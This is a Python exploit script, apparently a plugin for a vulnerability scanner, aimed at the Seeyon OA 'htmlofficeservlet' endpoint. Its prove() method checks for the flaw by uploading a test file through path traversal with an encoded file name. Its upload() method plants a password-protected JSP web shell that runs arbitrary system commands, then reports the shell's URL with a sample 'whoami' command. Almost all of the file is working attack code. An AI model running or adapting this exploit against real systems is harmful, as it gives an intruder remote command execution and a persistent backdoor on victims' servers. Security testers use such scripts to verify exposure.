#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'

import random
import asyncio
from lib.utils.cipher import base64encode
from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'seeyon getshell'
        self.keyword = ['seeyon']
        self.info = 'seeyon getshell'
        self.type = VUL_TYPE.RCE
        self.level = VUL_LEVEL.HIGH
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            table = 'gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6'
            test_file = 'test' + str(random.randint(100000, 999999)) + '.txt'
            base64_file = str(base64encode('..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\{}'.format(test_file), table))
            url = self.base_url + 'seeyon/htmlofficeservlet'
            async with ClientSession() as session:
                async with session.get(url=url) as response:
                    if response !=None:
                        text = await response.text()
                        if 'DBSTEP V3.0' in text:
                            data = '''DBSTEP V3.0     355             0               22             DBSTEP=OKMLlKlV\r\nOPTION=S3WYOSWLBSGr\r\ncurrentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\nCREATEDATE=wUghPB3szB3Xwg66\r\nRECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\noriginalFileId=wV66\r\noriginalCreateDate=wUghPB3szB3Xwg66\r\nFILENAME={}\r\nneedReadFile=yRWZdAS6\r\noriginalCreateDate=wLSGP4oEzLKAz4=iz=66 \r\nthis is a test for me.f82abdd62cce9d2841a6efd5663e7bee'''.format(base64_file)
                            async with session.post(url=url, data = data) as response2:
                                # print(self.base_url +  'seeyon/' + test_file)
                                await asyncio.sleep(1)
                            url1 = self.base_url +  'seeyon/' + test_file
                            async with session.get(url=url1) as response2:
                                if response2 != None:
                                    text2 = await response2.text()
                                    if 'this is a test for me' in text2:
                                        self.flag = 1
                                        self.res.append({"info": url1, "key": 'seeyon getshell'})


    async def upload(self):
        await self.get_url()
        if self.base_url:
            table = 'gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6'
            test_file = 'test' + str(random.randint(100000,999999)) + '.jsp'
            base64_file = str(base64encode('..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\{}'.format(test_file),table))
            url = self.base_url + 'seeyon/htmlofficeservlet'
            async with ClientSession() as session:
                async with session.get(url=url) as response:
                    if response!=None:
                        text = await response.text()
                        if 'DBSTEP V3.0' in text:
                            data = '''DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV\r\nOPTION=S3WYOSWLBSGr\r\ncurrentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\nCREATEDATE=wUghPB3szB3Xwg66\r\nRECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\noriginalFileId=wV66\r\noriginalCreateDate=wUghPB3szB3Xwg66\r\nFILENAME='''+ base64_file + '''\r\nneedReadFile=yRWZdAS6\r\noriginalCreateDate=wLSGP4oEzLKAz4=iz=66\r\n<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if("test12345".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>c0a4500844f330626a5f11e1563b03f2'''
                            async with session.post(url=url, data = data) as response:
                                await asyncio.sleep(1)
                            url1 = self.base_url +  'seeyon/' + test_file
                            async with session.get(url=url1) as response1:
                                if response1 != None:
                                    text1 = await response1.text()
                                    if ':-)' in text1:
                                        self.flag = 1
                                        self.res.append({"info": url1 +'?pwd=test12345&cmd=whoami', "key": 'seeyon getshell'})